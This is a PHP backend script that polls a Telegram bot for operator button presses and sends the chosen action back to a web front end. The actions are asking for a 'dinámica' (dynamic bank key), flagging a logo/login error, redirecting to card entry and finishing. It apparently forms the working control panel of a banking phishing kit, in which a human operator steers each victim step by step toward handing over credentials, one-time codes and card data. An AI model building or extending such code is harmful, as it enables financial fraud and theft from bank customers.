<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId']     ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['action' => null]);
    exit;
}

$botToken = $config['bot_token'] ?? '';
$chatId   = $config['chat_id']   ?? '';

if (!$botToken || !$chatId) {
    echo json_encode(['action' => null]);
    exit;
}

// Evitar acciones repetidas con offset guardado en sesión
$offset = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data   = json_decode($response, true);
$action = null;

foreach ($data['result'] ?? [] as $update) {
    if (isset($update['update_id'])) {
        $_SESSION['last_update_id'] = $update['update_id'];
    }

    if (!isset($update['callback_query'])) {
        continue;
    }

    $callback = $update['callback_query'];
    $cbData   = $callback['data'] ?? '';

    // Verificamos que el callback_data contenga el transactionId
    if (strpos($cbData, $transactionId) === false) {
        continue;
    }

    // Obtener acción desde callback_data: "accion:transactionId"
    list($actionType, ) = explode(':', $cbData, 2);
    $action = $actionType;

    // ==========================
    // 1) Datos del mensaje original
    // ==========================
    $msg        = $callback['message'] ?? [];
    $origText   = $msg['text'] ?? '';
    $origChatId = $msg['chat']['id'] ?? $chatId;
    $origMsgId  = $msg['message_id'] ?? $messageId;

    // ==========================
    // 2) Datos del operador
    // ==========================
    $from = $callback['from'] ?? [];
    if (!empty($from['username'])) {
        $operador = '@' . $from['username'];
    } else {
        $fn = $from['first_name'] ?? '';
        $ln = $from['last_name']  ?? '';
        $operador = trim($fn . ' ' . $ln);
        if ($operador === '') {
            $operador = 'Operador';
        }
    }

    // ==========================
    // 3) Texto humano por acción
    // ==========================
    switch ($actionType) {
        case 'pedir_dinamica':
            $accionHumana = 'Pidió DINÁMICA';
            break;
        case 'error_logo':
            $accionHumana = 'Marcó ERROR DE LOGO';
            break;
        case 'tarjeta':
            $accionHumana = 'Redirigir a TARJETA';
            break;
        case 'confirm_finalizar':
            $accionHumana = 'FINALIZÓ la operación';
            break;
        default:
            $accionHumana = 'Acción desconocida';
            break;
    }

    // ==========================
    // 4) Editar mensaje en Telegram
    // ==========================
    if ($origText !== '') {
        $newText  = $origText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$operador}</b>";

        $editPayload = [
            'chat_id'      => $origChatId,
            'message_id'   => $origMsgId,
            'text'         => $newText,
            'parse_mode'   => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    break;
}

// Devuelve la acción para tu front (switch(result.action))
echo json_encode(['action' => $action]);
